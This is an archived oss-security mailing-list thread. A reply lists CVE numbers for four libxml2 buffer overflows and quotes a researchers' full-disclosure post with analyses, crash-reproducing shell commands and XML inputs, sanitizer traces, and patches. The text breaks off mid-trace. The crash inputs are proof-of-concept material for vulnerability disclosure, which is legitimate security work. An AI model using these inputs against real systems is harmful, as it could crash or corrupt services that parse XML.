X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["28358" "Monday" "22" "May" "2017" "11:15:19" "+0800" "Manh Dung Nguyen" "dungnguy@comp.nus.edu.sg" "<CALLhTwOhKKsnqDD0k7FMX_=zV+r-wDpGuNPN+FoeU8_Qd6nzzQ@mail.gmail.com>" "681" "[oss-security] Re: Invalid writes and reads in libxml2" nil nil nil "5" "2017052203:15:19" "[oss-security] Re: Invalid writes and reads in libxml2" (number mark "U       dungnguy@com May 22  681/28358 " thread-indent "\"[oss-security] Re: Invalid writes and reads in libxml2\"\n") "<660D1C70-CF56-48DF-8AC8-C8DE69193573@gmail.com>" ("<660D1C70-CF56-48DF-8AC8-C8DE69193573@gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11315 invoked by uid 550); 22 May 2017 03:47:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22371 invoked from network); 22 May 2017 03:16:33 -0000
X-Virus-Scanned: amavisd-new at comp.nus.edu.sg
X-Gm-Message-State: AODbwcDTMNCoEgjAwMsV4zi0ioWlpkm9sRNhi5y4ZwE+9XEuR7AmcBaL
	PSc3cYDFyoe2IY0jG5iPNP/b7S9eUQ==
X-Received: by 10.176.1.146 with SMTP id 18mr10640050ual.128.1495422959746;
 Sun, 21 May 2017 20:15:59 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <660D1C70-CF56-48DF-8AC8-C8DE69193573@gmail.com>
References: <660D1C70-CF56-48DF-8AC8-C8DE69193573@gmail.com>
From: Manh Dung Nguyen <dungnguy@comp.nus.edu.sg>
Date: Mon, 22 May 2017 11:15:19 +0800
X-Gmail-Original-Message-ID: <CALLhTwOhKKsnqDD0k7FMX_=zV+r-wDpGuNPN+FoeU8_Qd6nzzQ@mail.gmail.com>
Message-ID: <CALLhTwOhKKsnqDD0k7FMX_=zV+r-wDpGuNPN+FoeU8_Qd6nzzQ@mail.gmail.com>
To: =?UTF-8?Q?Marcel_B=C3=B6hme?= <boehme.marcel@gmail.com>
Cc: oss-security@lists.openwall.com, Thuan Pham <thuanpv.nus@gmail.com>, 
	veillard@redhat.com
Content-Type: multipart/alternative; boundary="001a114178c24e21c90550144a11"
Subject: [oss-security] Re: Invalid writes and reads in libxml2

--001a114178c24e21c90550144a11
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Dear All,

Please find below the CVEs that have been assigned by MITRE.

1) BUG 781333 - STACK OVERFLOW IN VALID.C: *CVE-2017-9047*
https://bugzilla.gnome.org/show_bug.cgi?id=3D781333

2) BUG 781701 - ANOTHER STACK OVERFLOW in VALID.C: *CVE-2017-9048*
https://bugzilla.gnome.org/show_bug.cgi?id=3D781701

3) BUG 781205 - HEAP-BASED BUFFER OVERFLOW IN xmlDictComputeFastKey:
*CVE-2017-9049*
https://bugzilla.gnome.org/show_bug.cgi?id=3D781205

4) BUG 781361 - HEAP-BASED BUFFER OVERFLOW IN xmlDictAddString:
*CVE-2017-9050*
https://bugzilla.gnome.org/show_bug.cgi?id=3D781361

Thanks,
Manh Dung



On 15 May 2017 at 12:57, Marcel B=C3=B6hme <boehme.marcel@gmail.com> wrote:

> Dear all,
>
> In a fuzzing session with AFLGo, a directed version of AFL/AFLFast, we
> found four crashers (two invalid writes and two invalid reads) in LibXML2.
> These were reported to the maintainers one month ago. We provided analysis
> and patches and sent several email-reminders, explaining our intend to
> disclose, but there has been no response. The bug reports are currently n=
ot
> public. So, in the spirit of full disclosure, we attach the bug reports
> with analysis and patches here. Using the record of this email, we are
> going to request CVEs from MITRE.
>
> We can reproduce these vulns in the DOM-validator of PHP (
> https://bugs.php.net/bug.php?id=3D74459) and recommend to apply the patch=
es
> provided below to prevent exploitation. Patches were checked against the
> regression test suite of PHP and LibXML2. However, these patches have *no=
t*
> been reviewed, yet.
>
> Credits for finding, analysing, and patching the errors go to Marcel B=C3=
=B6hme
> and Van-Thuan Pham of TSUNAMi Security Research Centre, National Universi=
ty
> of Singapore.
> We thank Manh-Dung Nguyen for preparing this disclosure notice.
>
> +++++++++++++++++++++++++++++++++++++++++++++++
> +  1) BUG 781333 - STACK OVERFLOW IN VALID.C
> +  https://bugzilla.gnome.org/show_bug.cgi?id=3D781333
> +++++++++++++++++++++++++++++++++++++++++++++++
>
> Here is a quick analysis:
> The function xmlSnprintfElementContent in valid.c is supposed to
> recursively dump the element content definition into a char buffer 'buf' =
of
> size 'size'. The variable len is assigned strlen(buf). If the content->ty=
pe
> is XML_ELEMENT_CONTENT_ELEMENT, then (i) the content->prefix is appended =
to
> buf (if it actually fits) whereupon (ii) content->name is written to the
> buffer. However, the check whether the content->name actually fits also
> uses 'len' rather than the updated buffer length strlen(buf). This allows
> us to write about "size" many bytes beyond the allocated memory.
>
> $ ./xmllint --version
> /src/libxml2/.libs/lt-xmllint: using libxml version
> 20904-GITv2.9.4-16-g0741801
>   compiled with: Threads Tree Output Push Reader Patterns Writer SAXv1 FTP
> HTTP DTDValid HTML Legacy C14N Catalog XPath XPointer XInclude Iconv
> ISO8859X Unicode Regexps Automata Expr Schemas Schematron Modules Debug
>
> How to reproduce:
> $ s=3D$(printf "%-757s" "0")
> $ t=3D$(printf "%-4924s" "0")
> $ echo '<!DOCTYPEa[<!ELEMENT a (F'"${s// /0}:${t// /0}"')><!ATTLIST
> a><!ELEMENT b EMPTY><!ATTLIST b s CDATA #IMPLIED>]><a/>' > bug1.xml
> $ ./xmllint --valid bug1.xml
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> =3D=3D17183=3D=3DERROR: AddressSanitizer: stack-buffer-overflow on address
> 0x7fffb66dac88 at pc 0x7f2daa004f13 bp 0x7fffb66d9820 sp 0x7fffb66d9818
> WRITE of size 4925 at 0x7fffb66dac88 thread T0
>    #0 0x7f2daa004f12 in xmlSnprintfElementContent__internal_alias
> /src/libxml2/valid.c:1323:9
>    #1 0x7f2daa039d58 in xmlValidateElementContent
> /src/libxml2/valid.c:5445:6
>    #2 0x7f2daa039d58 in xmlValidateOneElement__internal_alias
> /src/libxml2/valid.c:6152
>    #3 0x7f2daa49b106 in xmlSAX2EndElementNs__internal_alias
> /src/libxml2/SAX2.c:2467:24
>    #4 0x7f2da9f1a4ca in xmlParseElement__internal_alias
> /src/libxml2/parser.c:10212:3
>    #5 0x7f2da9f33758 in xmlParseDocument__internal_alias
> /src/libxml2/parser.c:10962:2
>    #6 0x7f2da9f622f5 in xmlDoRead /src/libxml2/parser.c:15445:5
>    #7 0x7f2da9f622f5 in xmlCtxtReadFile__internal_alias
> /src/libxml2/parser.c:15690
>    #8 0x521133 in parseAndPrintFile /src/libxml2/xmllint.c:2391:9
>    #9 0x5184cd in main /src/libxml2/xmllint.c:3772:7
>    #10 0x7f2da8eb382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.
> so.6+0x2082f)
>    #11 0x41d2b8 in _start (/src/libxml2/.libs/lt-xmllint+0x41d2b8)
>
> Address 0x7fffb66dac88 is located in stack of thread T0 at offset 5128 in
> frame
>    #0 0x7f2daa032e5f in xmlValidateOneElement__internal_alias
> /src/libxml2/valid.c:5943
>
> This frame has 5 object(s):
>     [32, 82) 'fn.i' (line 5288)
>     [128, 5128) 'expr.i' (line 5441)
>     [5392, 10392) 'list.i' (line 5442) <=3D=3D Memory access at offset 51=
28
> partially underflows this variable
>     [10656, 10660) 'extsubset' (line 5950)
>     [10672, 10722) 'fn' (line 6063)
>
> PATCHED BY:
> --- a/valid.c
> +++ a/valid.c
> @@ -1270,6 +1270,7 @@ xmlSnprintfElementContent(char *buf, int size,
> xmlElementContentPtr content, int
>                 }
>                 strcat(buf, (char *) content->prefix);
>                 strcat(buf, ":");
> +               len +=3D xmlStrlen(content->prefix);
>             }
>             if (size - len < xmlStrlen(content->name) + 10) {
>                 strcat(buf, " ...");
>
> +++++++++++++++++++++++++++++++++++++++++++++++
> +  BUG 781701 - ANOTHER STACK OVERFLOW in VALID.C
> +  https://bugzilla.gnome.org/show_bug.cgi?id=3D 781701
> +++++++++++++++++++++++++++++++++++++++++++++++
>
> Here is a quick analysis:
> The bug is related to but different from Bug 781333. Function
> xmlSnprintfElementContent in valid.c is supposed to recursively dump the
> element content definition into a char buffer 'buf' of size 'size'. At the
> end of the routine, the function may strcat two more characters without
> checking whether the current strlen(buf) + 2 < size.
>
> $ ./xmllint --version
> /src/libxml2/.libs/lt-xmllint: using libxml version
> 20904-GITv2.9.4-16-g0741801
>   compiled with: Threads Tree Output Push Reader Patterns Writer SAXv1 FTP
> HTTP DTDValid HTML Legacy C14N Catalog XPath XPointer XInclude Iconv
> ISO8859X Unicode Regexps Automata Expr Schemas Schematron Modules Debug
>
> How to reproduce:
> $ ./xmllint --valid bug2.xml
> =3D=3D112703=3D=3DERROR: AddressSanitizer: stack-buffer-overflow on addre=
ss
> 0x7ffeff6f3428 at pc 0x7fd88f824d3c bp 0x7ffeff6f1fb0 sp 0x7ffeff6f1fa8
> WRITE of size 2 at 0x7ffeff6f3428 thread T0
>    #0 0x7fd88f824d3b in xmlSnprintfElementContent__internal_alias
> /src/libxml2/valid.c
>    #1 0x7fd88f859b8d in xmlValidateElementContent
> /src/libxml2/valid.c:5447:6
>    #2 0x7fd88f859b8d in xmlValidateOneElement__internal_alias
> /src/libxml2/valid.c:6154
>    #3 0x7fd89031cd6c in xmlSAX2EndElementNs__internal_alias
> /src/libxml2/SAX2.c:2467:24
>    #4 0x7fd88f63b242 in xmlParseEndTag2 /src/libxml2/parser.c:9930:2
>    #5 0x7fd88f5fec12 in xmlParseElement__internal_alias
> /src/libxml2/parser.c:10292:2
>    #6 0x7fd88f654709 in xmlParseDocument__internal_alias
> /src/libxml2/parser.c:10966:2
>    #7 0x7fd88f6d3647 in xmlDoRead /src/libxml2/parser.c:15449:5
>    #8 0x7fd88f6d3647 in xmlCtxtReadFile__internal_alias
> /src/libxml2/parser.c:15694
>    #9 0x559158 in parseAndPrintFile /src/libxml2/xmllint.c:2391:9
>    #10 0x54b0e4 in main /src/libxml2/xmllint.c:3772:7
>    #11 0x7fd88e40b82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.
> so.6+0x2082f)
>    #12 0x41d0b8 in _start (/src/libxml2/.libs/lt-xmllint+0x41d0b8)
>
> Address 0x7ffeff6f3428 is located in stack of thread T0 at offset 5128 in
> frame
>    #0 0x7fd88f852c6f in xmlValidateOneElement__internal_alias
> /src/libxml2/valid.c:5945
>
>  This frame has 5 object(s):
>    [32, 82) 'fn.i' (line 5290)
>    [128, 5128) 'expr.i' (line 5443) <=3D=3D Memory access at offset 5128
> overflows this variable
>    [5392, 10392) 'list.i' (line 5444)
>    [10656, 10660) 'extsubset' (line 5952)
>    [10672, 10722) 'fn' (line 6065)
> HINT: this may be a false positive if your program uses some custom
> stack unwind mechanism or swapcontext
>      (longjmp and C++ exceptions *are* supported)
> SUMMARY: AddressSanitizer: stack-buffer-overflow /src/libxml2/valid.c
> in xmlSnprintfElementContent__internal_alias
>
> PATCHED BY:
> --- a/valid.c
> +++ a/valid.c
> @@ -1320,6 +1320,7 @@ xmlSnprintfElementContent(char *buf, int size,
> xmlElementContentPtr content, int
>                 xmlSnprintfElementContent(buf, size, content->c2, 0);
>             break;
>      }
> +    if (size - strlen(buf) <=3D 2) return;
>      if (englob)
>          strcat(buf, ")");
>      switch (content->ocur) {
>
> +++++++++++++++++++++++++++++++++++++++++++++++
> +  BUG 781205 - HEAP-BASED BUFFER OVERFLOW IN xmlDictComputeFastKey (NEW)
> +  https://bugzilla.gnome.org/show_bug.cgi?id=3D 781205
> +++++++++++++++++++++++++++++++++++++++++++++++
>
> We understand that a similar bug report (non-public) was filed before:
> https://bugzilla.gnome.org/show_bug.cgi?id=3D759398
> and fixed about a year ago in git revision 45752d2:
> https://github.com/GNOME/libxml2/commit/45752d2c334b50016666d8f0ec3691
> e2d680f0a0
>
> However, the patch was apparently incomplete.
>
> How to reproduce with xmllint:
> $ ./xmllint --version
> /src/libxml2/.libs/lt-xmllint: using libxml version
> 20904-GITv2.9.4-16-g0741801
>   compiled with: Threads Tree Output Push Reader Patterns Writer SAXv1 FTP
> HTTP DTDValid HTML Legacy C14N Catalog XPath XPointer XInclude Iconv
> ISO8859X Unicode Regexps Automata Expr Schemas Schematron Modules Debug
>
>
> $ printf "%s\x0d%s\x0da\x09%s" '<?l?><!DOCTYPED[<!ENTITY' '%'
> '"<:0000">%a;' > bug3.xml
> $ ./xmlint --memory --oldxml10 bug3.xml
>
> ASAN says (for libxml2 in trunk):
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> =3D=3D18512=3D=3DERROR: AddressSanitizer: heap-buffer-overflow on address
> 0x60200000020f at pc 0x7fb731bca172 bp 0x7ffe8fe8cd10 sp 0x7ffe8fe8cd08
> READ of size 1 at 0x60200000020f thread T0
>    #0 0x7fb731bca171 in xmlDictComputeFastKey /src/libxml2/dict.c:448:13
>    #1 0x7fb731bca171 in xmlDictLookup__internal_alias
> /src/libxml2/dict.c:851
>    #2 0x7fb7315f7760 in xmlParseNameComplex /src/libxml2/parser.c
>    #3 0x7fb7315f7760 in xmlParseName__internal_alias
> /src/libxml2/parser.c:3487
>    #4 0x7fb7316afe66 in xmlParseQName /src/libxml2/parser.c:8900:10
>    #5 0x7fb7316691c5 in xmlParseStartTag2 /src/libxml2/parser.c:9419:17
>    #6 0x7fb7316643dc in xmlParseElement__internal_alias
> /src/libxml2/parser.c:10179:16
>    #7 0x7fb73167f758 in xmlParseDocument__internal_alias
> /src/libxml2/parser.c:10962:2
>    #8 0x7fb7316ac7ac in xmlDoRead /src/libxml2/parser.c:15445:5
>    #9 0x7fb7316aceb4 in xmlReadMemory__internal_alias
> /src/libxml2/parser.c:15531:13
>    #10 0x5214c0 in parseAndPrintFile /src/libxml2/xmllint.c:2371:9
>    #11 0x5184cd in main /src/libxml2/xmllint.c:3772:7
>    #12 0x7fb7305ff82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.
> so.6+0x2082f)
>    #13 0x41d2b8 in _start (/src/libxml2/.libs/lt-xmllint+0x41d2b8)
>
> 0x60200000020f is located 1 bytes to the left of 6-byte region
> [0x602000000210,0x602000000216)
> allocated by thread T0 here:
>    #0 0x4d8018 in malloc /src/llvm/projects/compiler-
> rt/lib/asan/asan_malloc_linux.cc:66
>    #1 0x7fb7315f9fe3 in xmlNewBlanksWrapperInputStream
> /src/libxml2/parser.c:2477:14
>    #2 0x7fb731642dd6 in xmlParsePEReference__internal_alias
> /src/libxml2/parser.c:8122:14
>    #3 0x7fb73164218b in xmlParseMarkupDecl__internal_alias
> /src/libxml2/parser.c:7031:2
>    #4 0x7fb731680e66 in xmlParseInternalSubset /src/libxml2/parser.c:8482=
:6
>    #5 0x7fb73167eec4 in xmlParseDocument__internal_alias
> /src/libxml2/parser.c:10930:6
>    #6 0x7fb7316ac7ac in xmlDoRead /src/libxml2/parser.c:15445:5
>    #7 0x7fb7316aceb4 in xmlReadMemory__internal_alias
> /src/libxml2/parser.c:15531:13
>    #8 0x5214c0 in parseAndPrintFile /src/libxml2/xmllint.c:2371:9
>    #9 0x5184cd in main /src/libxml2/xmllint.c:3772:7
>    #10 0x7fb7305ff82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.
> so.6+0x2082f)
>
> SUMMARY: AddressSanitizer: heap-buffer-overflow /src/libxml2/dict.c:448:13
> in xmlDictComputeFastKey
>
> Valgrind says (for my installed version of xmllint)
> $  xmllint --version
> xmllint: using libxml version 20903
>   compiled with: Threads Tree Output Push Reader Patterns Writer SAXv1 FTP
> HTTP DTDValid HTML Legacy C14N Catalog XPath XPointer XInclude Iconv
> ISO8859X Unicode Regexps Automata Expr Schemas Schematron Modules Debug
> Zlib Lzma
>
> =3D=3D38641=3D=3D Invalid read of size 1
> =3D=3D38641=3D=3D    at 0x4F75CE8: xmlDictLookup (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E7C523: xmlParseName (in /usr/lib/x86_64-linux=
-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8503C: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E852EB: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8CE2E: xmlParseElement (in /usr/lib/x86_64-li=
nux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8D949: xmlParseDocument (in /usr/lib/x86_64-l=
inux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E947BD: xmlReadMemory (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x111F98: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D38641=3D=3D  Address 0x8303e7f is 1 bytes before a block of size 6 =
alloc'd
> =3D=3D38641=3D=3D    at 0x4C2DB8F: malloc (in /usr/lib/valgrind/vgpreload_
> memcheck-amd64-linux.so)
> =3D=3D38641=3D=3D    by 0x4E75FCB: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8871F: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E88954: xmlParseMarkupDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E89214: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8DB4E: xmlParseDocument (in /usr/lib/x86_64-l=
inux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E947BD: xmlReadMemory (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x111F98: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D38641=3D=3D
> =3D=3D38641=3D=3D Invalid read of size 1
> =3D=3D38641=3D=3D    at 0x4C32758: memcpy@@GLIBC_2.14 (in
> /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
> =3D=3D38641=3D=3D    by 0x4F74FBD: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4F75C3C: xmlDictLookup (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E7C523: xmlParseName (in /usr/lib/x86_64-linux=
-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8503C: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E852EB: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8CE2E: xmlParseElement (in /usr/lib/x86_64-li=
nux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8D949: xmlParseDocument (in /usr/lib/x86_64-l=
inux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E947BD: xmlReadMemory (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x111F98: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D38641=3D=3D  Address 0x8303e7f is 1 bytes before a block of size 6 =
alloc'd
> =3D=3D38641=3D=3D    at 0x4C2DB8F: malloc (in /usr/lib/valgrind/vgpreload_
> memcheck-amd64-linux.so)
> =3D=3D38641=3D=3D    by 0x4E75FCB: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8871F: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E88954: xmlParseMarkupDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E89214: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E8DB4E: xmlParseDocument (in /usr/lib/x86_64-l=
inux-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x4E947BD: xmlReadMemory (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D38641=3D=3D    by 0x111F98: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x10EDFE: ??? (in /usr/bin/xmllint)
> =3D=3D38641=3D=3D    by 0x521582F: (below main) (libc-start.c:291)
> =3D=3D38641=3D=3D
>
> PATCHED BY:
> --- a/parser.c
> +++ a/parser.c
> @@ -3312,6 +3312,7 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
>      int len =3D 0, l;
>      int c;
>      int count =3D 0;
> +    size_t startPosition =3D 0;
>
>  #ifdef DEBUG
>      nbParseNameComplex++;
> @@ -3323,6 +3324,7 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
>      GROW;
>      if (ctxt->instate =3D=3D XML_PARSER_EOF)
>          return(NULL);
> +    startPosition =3D CUR_PTR - BASE_PTR;
>      c =3D CUR_CHAR(l);
>      if ((ctxt->options & XML_PARSE_OLD10) =3D=3D 0) {
>          /*
> @@ -3420,9 +3422,11 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
>          xmlFatalErr(ctxt, XML_ERR_NAME_TOO_LONG, "Name");
>          return(NULL);
>      }
> -    if ((*ctxt->input->cur =3D=3D '\n') && (ctxt->input->cur[-1] =3D=3D =
'\r'))
> -        return(xmlDictLookup(ctxt->dict, ctxt->input->cur - (len + 1),
> len));
> -    return(xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));
> +
> +    if (BASE_PTR + startPosition + len > ctxt->input->end)
> +      return(NULL);
> +
> +    return(xmlDictLookup(ctxt->dict, BASE_PTR + startPosition, len));
>  }
>
>  /**
>
> +++++++++++++++++++++++++++++++++++++++++++++++
> +  BUG 781361 - HEAP-BASED BUFFER OVERFLOW IN xmlDictAddString
> +  https://bugzilla.gnome.org/show_bug.cgi?id=3D 781361
> +++++++++++++++++++++++++++++++++++++++++++++++
>
> Again, we understand that a similar bug report was filed before:
> https://bugzilla.gnome.org/show_bug.cgi?id=3D758605 (CVE-2016-1839)
> and fixed about a year ago in git revision a820dbe:
> https://git.gnome.org/browse/libxml2/commit/?id=3D
> a820dbeac29d330bae4be05d9ecd939ad6b4aa33
>
> However, this patch was apparently incomplete, as well.
>
> LIBXML version:
> $ ./xmllint --version
> /src/libxml2/.libs/lt-xmllint: using libxml version
> 20904-GITv2.9.4-16-g0741801
>   compiled with: Threads Tree Output Push Reader Patterns Writer SAXv1 FTP
> HTTP DTDValid HTML Legacy C14N Catalog XPath XPointer XInclude Iconv
> ISO8859X Unicode Regexps Automata Expr Schemas Schematron Modules Debug
>
> How to reproduce:
> $ ./xmllint --oldxml10 bug4.xml
>
> ASAN says:
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> =3D=3D44604=3D=3DERROR: AddressSanitizer: heap-buffer-overflow on address
> 0x603000000030 at pc 0x0000004c1685 bp 0x7ffc15d12290 sp
> 0x7ffc15d11a40
> READ of size 109 at 0x603000000030 thread T0
>    #0 0x4c1684 in __asan_memcpy /src/llvm/projects/compiler-
> rt/lib/asan/asan_interceptors.cc:455
>    #1 0x7fa6e0af4b91 in xmlDictAddString /src/libxml2/dict.c:285:5
>    #2 0x7fa6e0af4b91 in xmlDictLookup__internal_alias
> /src/libxml2/dict.c:926
>    #3 0x7fa6e0522740 in xmlParseNameComplex /src/libxml2/parser.c
>    #4 0x7fa6e0522740 in xmlParseName__internal_alias
> /src/libxml2/parser.c:3487
>    #5 0x7fa6e056afe6 in xmlParseElementDecl__internal_alias
> /src/libxml2/parser.c:6718:16
>    #6 0x7fa6e056d4f0 in xmlParseMarkupDecl__internal_alias
> /src/libxml2/parser.c:6997:4
>    #7 0x7fa6e05abe66 in xmlParseInternalSubset /src/libxml2/parser.c:8482=
:6
>    #8 0x7fa6e05a9ec4 in xmlParseDocument__internal_alias
> /src/libxml2/parser.c:10930:6
>    #9 0x7fa6e05d7bd8 in xmlDoRead /src/libxml2/parser.c:15445:5
>    #10 0x7fa6e05d7bd8 in xmlReadFile__internal_alias
> /src/libxml2/parser.c:15507
>    #11 0x521ac8 in parseAndPrintFile /src/libxml2/xmllint.c:2408:9
>    #12 0x51872d in main /src/libxml2/xmllint.c:3775:7
>    #13 0x7fa6df52a82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.
> so.6+0x2082f)
>    #14 0x41d2b8 in _start (/src/libxml2/.libs/lt-xmllint+0x41d2b8)
>
> 0x603000000030 is located 0 bytes to the right of 32-byte region
> [0x603000000010,0x603000000030)
> allocated by thread T0 here:
>    #0 0x4d8018 in malloc /src/llvm/projects/compiler-
> rt/lib/asan/asan_malloc_linux.cc:66
>    #1 0x7fa6e0af4c73 in xmlDictLookup__internal_alias
> /src/libxml2/dict.c:932:10
>    #2 0x7fa6e05793b8 in xmlDetectSAX2 /src/libxml2/parser.c:1078:24
>    #3 0x7fa6e05a8a44 in xmlParseDocument__internal_alias
> /src/libxml2/parser.c:10844:5
>    #4 0x7fa6e05d7bd8 in xmlDoRead /src/libxml2/parser.c:15445:5
>    #5 0x7fa6e05d7bd8 in xmlReadFile__internal_alias
> /src/libxml2/parser.c:15507
>    #6 0x521ac8 in parseAndPrintFile /src/libxml2/xmllint.c:2408:9
>    #7 0x51872d in main /src/libxml2/xmllint.c:3775:7
>    #8 0x7fa6df52a82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.
> so.6+0x2082f)
>
>
> For the version of libxml that comes pre-installed on Ubuntu 16.04:
> $ xmllint --version
> xmllint: using libxml version 20903
>   compiled with: Threads Tree Output Push Reader Patterns Writer SAXv1 FTP
> HTTP DTDValid HTML Legacy C14N Catalog XPath XPointer XInclude Iconv
> ISO8859X Unicode Regexps Automata Expr Schemas Schematron Modules Debug
> Zlib Lzma
>
> VALGRIND says:
> =3D=3D146420=3D=3D ERROR SUMMARY: 216 errors from 2 contexts (suppressed:=
 0 from 0)
> =3D=3D146420=3D=3D
> =3D=3D146420=3D=3D 54 errors in context 1 of 2:
> =3D=3D146420=3D=3D Invalid read of size 1
> =3D=3D146420=3D=3D    at 0x4C32758: memcpy@@GLIBC_2.14 (in
> /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
> =3D=3D146420=3D=3D    by 0x4F74FBD: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4F75C3C: xmlDictLookup (in /usr/lib/x86_64-lin=
ux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E7C523: xmlParseName (in /usr/lib/x86_64-linu=
x-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E83B1F: xmlParseElementDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E889F4: xmlParseMarkupDecl (in
> /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E89214: ??? (in /usr/lib/x86_64-linux-gnu/
> libxml2.so.2.9.3)
> =3D=3D146420=3D=3D    by 0x4E8DB4E: xmlParseDocument (in /usr/lib/x86_64-=
linux-gnu/
